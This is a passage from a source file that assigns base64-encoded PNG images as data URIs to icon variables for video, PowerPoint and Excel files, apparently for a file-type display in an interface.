6HgqakhNOyLuooBdh1Goo/Swsfm7dixcTjiaBnDGAID3ZJ6fbpdgJi5amRvH35jyk874HlXW80UgJQEH0s6nMLAncwY1NkAXJzX4r6Mn9wkWBWFwEA15/StOXJ2WlKayA5Rnu7VsnJa5kOIqN8VNcqYDzfWGd9vC/rzkgtTCaIIptl+3+NT9kDsUl7uthiwAvQSgJUtQXm30VG+rSz6mIrDtHL1SIzHyUWcxs3ZHU6oPriid7G9NsD0Tjt8XJXEn0hCMsaa7J+6k2ZVL4PEACQeL0Oxi8g2kOQDQ3rre/35SYuFeXVtpyq4NkiNwzwf3ti2APDHuinBYZDqJ8G7Lf4vwX/OW1KHgk/AAAAAElFTkSuQmCC",
            video_icon = "data:image/png;base64,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",
            powerpoint_icon = "data:image/png;base64,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",
            excel_icon = "data:image/png;base64,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",
